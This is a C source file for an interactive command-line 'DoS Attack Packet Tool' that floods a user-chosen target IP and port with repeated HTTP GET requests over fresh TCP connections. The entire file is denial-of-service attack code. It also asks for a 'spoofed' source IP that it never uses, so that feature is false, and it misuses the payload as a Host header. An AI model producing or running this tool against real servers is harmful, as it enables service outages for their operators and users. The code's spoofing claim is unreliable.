#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>

// Function prototypes
void craftHTTPFlood(char *targetIP, int port, int packetCount, char *payload, char *sourceIP);
void sendPacket(char *packet, int len, char *targetIP, int port);
void displayMenu();
void getFloodPacketData(char *targetIP, int *port, int *packetCount, char *payload, char *sourceIP);

int main() {
    int choice;
    while (1) {
        displayMenu();
        printf("Select an option: ");
        scanf("%d", &choice);
        getchar();  // To clear newline

        switch (choice) {
            case 1:
                {
                    char targetIP[50], payload[1024], sourceIP[50];
                    int port, packetCount;

                    getFloodPacketData(targetIP, &port, &packetCount, payload, sourceIP);
                    craftHTTPFlood(targetIP, port, packetCount, payload, sourceIP);
                }
                break;
            case 0:
                printf("Exiting the program.\n");
                return 0;
            default:
                printf("Invalid option! Try again.\n");
        }
    }

    return 0;
}

void displayMenu() {
    printf("=== DoS Attack Packet Tool ===\n");
    printf("1. Craft HTTP Flood Packet\n");
    printf("0. Exit\n");
}

void getFloodPacketData(char *targetIP, int *port, int *packetCount, char *payload, char *sourceIP) {
    printf("Enter the target IP address: ");
    fgets(targetIP, 50, stdin);
    targetIP[strcspn(targetIP, "\n")] = '\0';  // Remove newline character

    printf("Enter the source IP address (spoofed): ");
    fgets(sourceIP, 50, stdin);
    sourceIP[strcspn(sourceIP, "\n")] = '\0';

    printf("Enter the target port number (default for HTTP is 80): ");
    scanf("%d", port);
    getchar();

    printf("Enter the number of packets to send: ");
    scanf("%d", packetCount);
    getchar();

    printf("Enter the custom payload data (e.g., 'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n'): ");
    fgets(payload, 1024, stdin);
    payload[strcspn(payload, "\n")] = '\0';
}

void craftHTTPFlood(char *targetIP, int port, int packetCount, char *payload, char *sourceIP) {
    char packet[4096];
    struct sockaddr_in destAddr;

    memset(&destAddr, 0, sizeof(destAddr));
    destAddr.sin_family = AF_INET;
    destAddr.sin_port = htons(port);
    destAddr.sin_addr.s_addr = inet_addr(targetIP);

    for (int i = 0; i < packetCount; i++) {
        memset(packet, 0, sizeof(packet));

        // Build HTTP request packet
        sprintf(packet, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n", payload); 

        sendPacket(packet, strlen(packet), targetIP, port);
    }
}

void sendPacket(char *packet, int len, char *targetIP, int port) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);  // TCP connection for HTTP
    if (sockfd < 0) {
        perror("Socket creation failed");
        return;
    }

    struct sockaddr_in destAddr;
    destAddr.sin_family = AF_INET;
    destAddr.sin_port = htons(port);
    destAddr.sin_addr.s_addr = inet_addr(targetIP);

    if (connect(sockfd, (struct sockaddr *)&destAddr, sizeof(destAddr)) < 0) {
        perror("Connection failed");
        close(sockfd);
        return;
    }

    if (send(sockfd, packet, len, 0) < 0) {
        perror("Packet sending failed");
    } else {
        printf("Packet sent to %s on port %d\n", targetIP, port);
    }

    // Optionally, receive and display response
    char response[4096];
    int bytes = recv(sockfd, response, sizeof(response) - 1, 0);
    if (bytes > 0) {
        response[bytes] = '\0';
        printf("Response: %s\n", response);
    }

    close(sockfd);
}
